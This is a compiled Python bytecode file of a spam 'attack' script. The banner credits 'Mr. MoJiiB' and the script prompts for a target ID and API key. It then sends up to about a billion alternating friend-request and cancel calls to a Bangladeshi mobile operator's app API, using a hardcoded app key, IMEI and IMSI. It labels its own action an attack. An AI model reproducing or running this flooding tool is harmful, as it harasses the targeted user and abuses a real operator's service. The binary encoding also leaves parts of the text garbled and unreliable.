o
    ��bp	  �                   @   sZ  d dl Z e �d� d dl Z e �d� ed� d dlZd dl Z d dlZd dlZd dlZdZdZdZ	dZ
d	Zd
ZdZdd� Zeee	d e ��Zeee	d e
 ��Ze �d� eed � e�d�Zeed � ee	d � eed e	 d e d � e�d� ee
de�� d � eed � ee
d � d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ de d Zedd�Zd ed!< d"e d# Zedd�Zd ed!< ed$�D ]8Zejeed%�Z e�d&� ejeed%�Z e�d&� e j!Ze�"e�Z#ej$e#d&d'�Z%ee
eed& g� e e% � q�eee	d( e
 d) e	 d* ��Z&e �d� dS )+�    N�clearzlolcat banner.py�
z[1;90mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mc                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )Nr   �{�G�z�?)�sys�stdout�write�flush�time�sleep)ZPuDiNaZword� r   �jx.py�	logoprint   s
   
�r   z
[>]   ENTER CIRCLE ID: z
[>]   ENTER API KEY: z4
==================================================
zhttps://ipinfo.io/jsonz	 DEVELOPED BY : Mr. MoJiiBz	 VERSION 	  : 3.0u   	 ♥♥z	 Mr. MoJiiBr   z	 Your IP Addreds:- Zipz3
==================================================z$  To Stop Attack press CTRL + Z....
)�CaseInsensitiveDictzYhttps://circle.robi.com.bd/mylife/appapi/appcall.php?op=sendFren&app_version=81&nickname=zJ&msgId=71&imei=3551761365757&imsi=47002250036475&retry=false&operator=RobiZ(000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg)z	x-api-keyz	x-app-key�gzipz
User-AgentzYhttps://circle.robi.com.bd/mylife/appapi/appcall.php?op=stopFren&app_version=81&nickname=zI&msgId=71&imei=355176136575&imsi=47002250036475&retry=false&operator=Robii�ɚ;)�headers�   )�indentz Pressz Enterz To Exit)'�os�system�printZasyncior   Zrequestsr	   ZbiblackZbiredZbigreenZbiyellowZbiblueZbipurpleZbicyanr   �str�input�userZapi�getZresponser
   ZjsonZrequests.structuresr   Zurl2Zheaders2Zurlr   �range�iZpostZresp�text�loadsZjson_object�dumpsZjson_formatted_strZxnr   r   r   r   �<module>   sh    





	




  